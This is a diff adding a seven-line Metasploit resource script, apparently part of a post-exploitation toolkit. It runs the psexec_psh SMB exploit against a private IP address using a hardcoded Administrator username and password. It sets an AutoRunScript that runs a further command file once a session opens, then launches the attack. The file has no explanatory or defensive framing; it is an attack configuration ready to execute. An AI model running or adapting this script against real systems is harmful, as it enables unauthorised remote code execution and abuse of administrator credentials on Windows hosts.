@@ -1,0 +1,7 @@
+use exploit/windows/smb/psexec_psh
+set rhost 172.16.173.194
+set SMBUser Administrator
+set SMBPass abc123!
+set EXITFUNC seh
+set AutoRunScript multi_console_command -rc /root/2fassassin/cert/transport/instruction/puss
+run
